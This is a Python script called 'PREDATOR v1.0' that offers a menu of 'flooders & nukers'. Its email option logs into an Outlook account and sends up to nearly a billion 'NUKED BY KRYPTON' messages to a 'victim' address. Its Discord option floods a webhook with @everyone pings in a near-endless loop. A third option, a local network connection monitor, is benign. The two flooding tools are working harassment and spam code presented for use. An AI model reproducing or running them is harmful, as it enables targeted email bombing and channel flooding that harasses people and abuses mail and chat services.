from urllib.parse import urlparse, urljoin
from email.message import EmailMessage
from colorama import Fore, Back, Style
from email.mime.text import MIMEText
from bs4 import BeautifulSoup
import concurrent.futures
import urllib.request
import urllib.parse
import dns.resolver
import subprocess
import threading
import colorama
import requests
import argparse
import getpass
import smtplib
import psutil
import socket
import json
import time
import os

print(f"{Fore.WHITE}=========================================================================")
print(f"{Fore.RED}   ██▓███   ██▀███  ▓█████ ▓█████▄  ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███      ")
print(f"{Fore.RED}  ▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒    ")
print(f"{Fore.RED}  ▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░██   █▌▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒    ")
print(f"{Fore.RED}  ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄      ")
print(f"{Fore.RED}  ▒██▒ ░  ░░██▓ ▒██▒░▒████▒░▒████▓  ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒    ")
print(f"{Fore.RED}  ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░    ")
print(f"{Fore.RED}  ░▒ ░       ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░    ")
print(f"{Fore.RED}  ░░   v1.0  ░░   ░    ░    ░ ░  ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░     ")
print(f"{Fore.RED}              ░        ░  ░   ░          ░  ░            ░ ░     ░         ")
print(f"{Fore.WHITE}=========================================================================")
print(f"{Fore.YELLOW} >FLOODERS & NUKERS ")
print(f"{Fore.GREEN}    1)EMAIL NUKER")
print(f"{Fore.GREEN}    2)DISCORD SERVER NUKER")
print(f"{Fore.YELLOW} >SNIFFERS & MONITORING")
print(f"{Fore.GREEN}    3)CONNECTION MONITOR")
print(f"{Fore.WHITE}=========================================================================")
Method_Number=input(f"{Fore.WHITE} ENTER METHOD NUMBER : ")
print(f"{Fore.WHITE}=========================================================================")


if Method_Number =='1':
    outlook_mail = input(f"{Fore.WHITE} ENTER OUTLOOK EMAIL : ")
    outlook_pass = getpass.getpass(f"{Fore.WHITE} ENTER OUTLOOK EMAIL'S PASSWORD : ")
    recipient_mail = input(" ENTER VICTIM'S EMAIL ADDRESS : ")
    print(f"{Fore.WHITE}=========================================================================")
    server = smtplib.SMTP('smtp.office365.com', 587)
    server.starttls()
    server.login(outlook_mail, outlook_pass)
    for i in range(999999999):
        # Create a new EmailMessage object for each email
        msg = EmailMessage()
        msg.set_content("!!! NUKED BY KRYPTON !!!")
        msg['Subject'] = f"!!! NUKED BY KRYPTON !!!"
        msg['From'] = outlook_mail
        msg['To'] = recipient_mail
        time.sleep(5)
        server.send_message(msg)
        print(f" {i+1}'ST EMAIL SENT")
    print(f"{Fore.WHITE}=========================================================================")


if Method_Number =='2':
    webhook_url = input(f"{Fore.WHITE} ENTER DISCORD WEBHOOK URL : ")
    recipient_username = input(" ENTER SENDER'S USERNAME : ")
    print(f"{Fore.WHITE}=========================================================================")
    for i in range(999999999):
        payload = {
            "content": f"@everyone !!! NUKED BY KRYPTON !!!",
            "username": recipient_username
        }
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            print(f"{Fore.GREEN} {i+1}'ST MESSAGE SENT ")
        else:
            print(f"{Fore.RED} ERROR SENDING MESSAGE {i+1}: ")
    print(f"{Fore.WHITE}=========================================================================")

if Method_Number =='3':
    def get_local_ip_address():
        return [(s.connect(("8.8.8.8", 80)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    def monitor_network_connections():
        local_ip_address = get_local_ip_address()
        while True:
            for conn in psutil.net_connections():
                if conn.status == psutil.CONN_ESTABLISHED:
                    local_addr = conn.laddr
                    remote_addr = conn.raddr
                    if local_addr.ip == local_ip_address:
                        time.sleep(0.25)
                        print(f"{Fore.GREEN} CONNECTIONS FROM IP : {remote_addr.ip}")
    monitor_network_connections()
